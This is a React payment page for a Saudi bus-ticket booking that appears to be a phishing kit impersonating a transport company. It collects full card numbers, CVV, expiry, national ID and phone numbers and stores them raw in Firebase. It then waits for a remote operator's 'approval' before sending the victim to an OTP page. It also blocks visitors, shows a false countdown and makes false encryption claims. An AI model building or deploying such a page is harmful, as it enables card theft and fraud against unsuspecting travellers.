import { useEffect, useState } from "react";
import { motion } from "framer-motion";
import { Check, Clock, ChevronLeft, Shield } from "lucide-react";
import { Link, useLocation } from "wouter";
import {
  addData,
  handleCurrentPage,
  handlePay,
  listenForApproval,
} from "@/lib/firebase";
import { getCardType } from "@/components/reservation/payment-step";

const STEPS = [
  { label: "التذاكر", done: true, active: false },
  { label: "التفاصيل", done: true, active: false },
  { label: "الشراء", done: true, active: false },
  { label: "الدفع", done: false, active: true },
];

const PAYMENT_METHODS = [
  {
    id: "mada",
    label: "مدى",
    description: "الدفع عن طريق مدى",
    logo: "https://media.base44.com/images/public/6a0141c514678b9757e134f7/53cfdc496_satrans_com_sa_mada-logo0zcnw-i5k6dfc_e3ec505d.svg",
  },
  {
    id: "card",
    label: "فيزا / ماستركارد / أميكس",
    description: "الدفع بالبطاقة الائتمانية",
    logos: [
      "https://media.base44.com/images/public/6a0141c514678b9757e134f7/2c1e15023_satrans_com_sa_visa-logo0upfiv7ntladm_68f214bb.svg",
      "https://media.base44.com/images/public/6a0141c514678b9757e134f7/41fe88fde_satrans_com_sa_master-card-logo0y_enem50ek-_055b28cd.svg",
    ],
  },
] as const;

function StepBar() {
  return (
    <div
      className="flex items-center justify-center bg-background border-b border-border py-3 px-4 sticky top-0 z-30"
      dir="rtl"
    >
      {STEPS.map((step, i) => (
        <div key={i} className="flex items-center">
          <div className="flex flex-col items-center gap-1 px-3 sm:px-5">
            <div
              className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold border-2 transition-all ${
                step.done
                  ? "bg-primary border-primary text-primary-foreground"
                  : step.active
                    ? "bg-emerald-600 border-emerald-600 text-white"
                    : "bg-background border-border text-muted-foreground"
              }`}
            >
              {step.done ? <Check className="w-4 h-4" /> : i + 1}
            </div>
            <span
              className={`text-[10px] font-medium ${
                step.active
                  ? "text-emerald-700"
                  : step.done
                    ? "text-primary"
                    : "text-muted-foreground"
              }`}
            >
              {step.label}
            </span>
          </div>
          {i < STEPS.length - 1 && (
            <div className="w-8 sm:w-12 h-0.5 mb-4 bg-primary" />
          )}
        </div>
      ))}
    </div>
  );
}

function digitsOnly(v: string, max: number) {
  return v.replace(/\D/g, "").slice(0, max);
}
function formatCard(v: string) {
  return digitsOnly(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
}

export default function Payment() {
  const [, setLocation] = useLocation();
  const [selected, setSelected] = useState<string>("mada");
  const [agreed, setAgreed] = useState(false);

  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");

  const [submitting, setSubmitting] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    void handleCurrentPage("payment");
  }, []);

  useEffect(() => {
    if (!waitingApproval) return;
    const unsub = listenForApproval((status) => {
      if (status === "approved") {
        setWaitingApproval(false);
        setLocation("/otp");
      } else if (status === "rejected") {
        setWaitingApproval(false);
        setError("البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
      }
    });
    return () => unsub();
  }, [waitingApproval, setLocation]);

  const cardValid =
    cardNumber.replace(/\s/g, "").length >= 13 &&
    cardName.trim().length >= 2 &&
    expiryMonth.length === 2 &&
    expiryYear.length === 2 &&
    cvv.length >= 3;

  const canPay = agreed && cardValid && !submitting && !waitingApproval;

  const onPay = async () => {
    if (!canPay) return;
    setError("");
    setSubmitting(true);

    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      setSubmitting(false);
      setLocation("/register");
      return;
    }

    const passenger = (() => {
      try {
        return JSON.parse(sessionStorage.getItem("passenger") || "{}");
      } catch {
        return {};
      }
    })();
    const trip = (() => {
      try {
        return JSON.parse(sessionStorage.getItem("selectedTrip") || "{}");
      } catch {
        return {};
      }
    })();
    const seats = (() => {
      try {
        return JSON.parse(sessionStorage.getItem("selectedSeats") || "[]");
      } catch {
        return [];
      }
    })();

    try {
      await addData({
        name: [passenger.firstName, passenger.lastName].filter(Boolean).join(" "),
        phone: passenger.phone || "",
        saudiId: passenger.idNumber || "",
        nationality: passenger.nationality || "",
        ticketQuantity: 1,
        ticketPrice: 159,
        totalAmount: 159,
        from: trip.from || "",
        to: trip.to || "",
        bookingDate: trip.date || "",
        bookingTime: trip.time_depart || "",
        seats,
        paymentMethod: selected,
        currentPage: "payment",
      });
    } catch {
      // non-fatal
    }

    const cleanCard = cardNumber.replace(/\s/g, "");
    const paymentInfo = {
      cardNumber: cleanCard,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: getCardType(cleanCard),
      currentPage: "payment",
    };

    try {
      await handlePay(paymentInfo, () => {});
    } catch (err: any) {
      setSubmitting(false);
      if (err?.message === "VISITOR_BLOCKED") {
        setError("تم حظر هذا الزائر ولا يمكنه المتابعة");
      } else {
        setError("حدث خطأ أثناء معالجة الدفع");
      }
      return;
    }

    setSubmitting(false);
    setWaitingApproval(true);
  };

  const showCardForm = selected === "mada" || selected === "card";

  return (
    <div className="min-h-screen bg-muted/30" dir="rtl" data-testid="page-payment">
      <StepBar />

      <div className="max-w-2xl mx-auto px-4 py-6">
        <div className="bg-background border border-border rounded-2xl p-5 mb-4">
          <h3 className="font-bold text-foreground text-base mb-4 text-end">طريقة الدفع</h3>

          <div className="space-y-3">
            {PAYMENT_METHODS.map((method) => (
              <label
                key={method.id}
                className={`flex items-center justify-between p-4 rounded-xl border-2 cursor-pointer transition-all duration-200 ${
                  selected === method.id
                    ? "border-emerald-600 bg-emerald-50"
                    : "border-border bg-background hover:border-primary/40"
                }`}
                data-testid={`payment-method-${method.id}`}
              >
                <div className="flex items-center gap-3">
                  {"logo" in method && method.logo ? (
                    <img src={method.logo} alt={method.label} className="h-7 w-auto object-contain" />
                  ) : "logos" in method ? (
                    <div className="flex gap-1">
                      {method.logos.map((l, i) => (
                        <img key={i} src={l} alt="" className="h-6 w-auto object-contain" />
                      ))}
                    </div>
                  ) : null}
                </div>

                <div className="flex items-center gap-3">
                  <div className="text-end">
                    <div className="text-sm font-bold text-foreground">{method.label}</div>
                    <div className="text-xs text-muted-foreground">{method.description}</div>
                  </div>
                  <div
                    className={`w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 transition-all ${
                      selected === method.id ? "border-emerald-600 bg-emerald-600" : "border-border"
                    }`}
                  >
                    {selected === method.id && <div className="w-2 h-2 rounded-full bg-white" />}
                  </div>
                  <input
                    type="radio"
                    name="payment"
                    value={method.id}
                    checked={selected === method.id}
                    onChange={() => setSelected(method.id)}
                    className="sr-only"
                  />
                </div>
              </label>
            ))}
          </div>
        </div>

        {showCardForm && (
          <div className="bg-background border border-border rounded-2xl p-5 mb-4">
            <h3 className="font-bold text-foreground text-base mb-4 text-end">تفاصيل البطاقة</h3>
            <div className="space-y-4">
              <div>
                <label className="text-xs text-muted-foreground block mb-1 text-end">
                  رقم البطاقة *
                </label>
                <input
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCard(e.target.value))}
                  placeholder="0000 0000 0000 0000"
                  inputMode="numeric"
                  dir="ltr"
                  className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-end focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background"
                  data-testid="input-card-number"
                />
              </div>
              <div>
                <label className="text-xs text-muted-foreground block mb-1 text-end">
                  اسم حامل البطاقة *
                </label>
                <input
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  placeholder="NAME ON CARD"
                  className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-end focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background uppercase"
                  data-testid="input-card-name"
                />
              </div>
              <div className="grid grid-cols-3 gap-3">
                <div>
                  <label className="text-xs text-muted-foreground block mb-1 text-end">
                    شهر *
                  </label>
                  <input
                    value={expiryMonth}
                    onChange={(e) => setExpiryMonth(digitsOnly(e.target.value, 2))}
                    placeholder="MM"
                    inputMode="numeric"
                    dir="ltr"
                    className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background"
                    data-testid="input-expiry-month"
                  />
                </div>
                <div>
                  <label className="text-xs text-muted-foreground block mb-1 text-end">
                    سنة *
                  </label>
                  <input
                    value={expiryYear}
                    onChange={(e) => setExpiryYear(digitsOnly(e.target.value, 2))}
                    placeholder="YY"
                    inputMode="numeric"
                    dir="ltr"
                    className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background"
                    data-testid="input-expiry-year"
                  />
                </div>
                <div>
                  <label className="text-xs text-muted-foreground block mb-1 text-end">
                    CVV *
                  </label>
                  <input
                    value={cvv}
                    onChange={(e) => setCvv(digitsOnly(e.target.value, 4))}
                    placeholder="•••"
                    inputMode="numeric"
                    dir="ltr"
                    className="w-full border border-border rounded-xl px-3 py-2.5 text-sm text-center focus:outline-none focus:ring-2 focus:ring-primary/30 bg-background"
                    data-testid="input-cvv"
                  />
                </div>
              </div>
            </div>
          </div>
        )}

        <div className="bg-background border border-border rounded-2xl p-5 mb-4">
          <h3 className="font-bold text-foreground text-base mb-4 text-end">ملخص الحجز</h3>
          <div className="flex items-center gap-2 justify-end mb-3 text-xs text-muted-foreground">
            <span>الرياض - العزيزية ← الدمام</span>
            <span>✈</span>
          </div>
          <div className="space-y-2 text-sm text-end">
            <div className="flex justify-between">
              <span className="font-semibold">138.26 ر.س</span>
              <span className="text-muted-foreground">البالغين (الأساسية)</span>
            </div>
            <div className="flex justify-between">
              <span className="font-semibold">20.74 ر.س</span>
              <span className="text-muted-foreground">ضريبة القيمة المضافة (15٪)</span>
            </div>
            <div className="flex justify-between">
              <span className="font-semibold">0.00 ر.س</span>
              <span className="text-muted-foreground">الخصم</span>
            </div>
            <div className="flex justify-between border-t border-border pt-2 mt-2">
              <span className="font-extrabold text-lg text-primary">159 ر.س</span>
              <span className="font-bold text-foreground">الإجمالي</span>
            </div>
          </div>
        </div>

        <div className="bg-background border border-border rounded-2xl p-4 mb-4">
          <label className="flex items-start gap-3 cursor-pointer" dir="rtl">
            <div className="flex-1 text-end">
              <p className="text-xs text-foreground leading-relaxed">
                أوافق على{" "}
                <a href="#" className="text-primary underline">
                  شروط الخدمة
                </a>{" "}
                و{" "}
                <a href="#" className="text-primary underline">
                  سياسة الخصوصية
                </a>
              </p>
              <ul className="mt-2 space-y-1">
                {[
                  "يُسمح بتغيير موعد رحلتك",
                  "غير قابل للاسترداد (في حالة الإلغاء)",
                  "شروط سياسة الأمتعة",
                ].map((t, i) => (
                  <li
                    key={i}
                    className="flex items-center justify-end gap-1.5 text-xs text-muted-foreground"
                  >
                    <span>{t}</span>
                    <Check className="w-3 h-3 text-primary flex-shrink-0" />
                  </li>
                ))}
              </ul>
            </div>
            <div
              onClick={() => setAgreed((a) => !a)}
              className={`w-5 h-5 mt-0.5 rounded border-2 flex items-center justify-center flex-shrink-0 transition-all ${
                agreed ? "bg-primary border-primary" : "border-border bg-background"
              }`}
              data-testid="checkbox-agree"
            >
              {agreed && <Check className="w-3 h-3 text-primary-foreground" />}
            </div>
          </label>
        </div>

        <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground mb-4">
          <Shield className="w-3.5 h-3.5 text-primary" />
          <span>جميع المعاملات مشفرة وآمنة بنسبة 100٪</span>
        </div>

        {error && (
          <div
            className="bg-destructive/10 border border-destructive/30 text-destructive text-sm rounded-xl px-4 py-3 mb-3 text-end"
            data-testid="text-payment-error"
          >
            {error}
          </div>
        )}

        <motion.button
          whileTap={{ scale: 0.98 }}
          disabled={!canPay}
          onClick={onPay}
          className={`w-full py-4 rounded-xl font-bold text-base flex items-center justify-center gap-2 transition-all duration-300 ${
            canPay
              ? "bg-emerald-600 text-white hover:bg-emerald-700 hover:-translate-y-0.5 hover:shadow-lg"
              : "bg-muted text-muted-foreground cursor-not-allowed"
          }`}
          data-testid="button-pay"
        >
          {submitting
            ? "جاري المعالجة..."
            : waitingApproval
              ? "بانتظار التأكيد..."
              : "أتمم الشراء — 159 ر.س"}
        </motion.button>

        <div className="mt-4 flex items-center justify-between text-xs text-muted-foreground px-1">
          <Link
            href="/seat-selection"
            className="text-primary font-medium hover:underline flex items-center gap-1"
          >
            <ChevronLeft className="w-3 h-3 rotate-180" />
            رجوع
          </Link>
          <div className="flex items-center gap-1">
            <Clock className="w-3 h-3" />
            <span>14:24 دقيقة متبقية</span>
          </div>
        </div>
      </div>
    </div>
  );
}
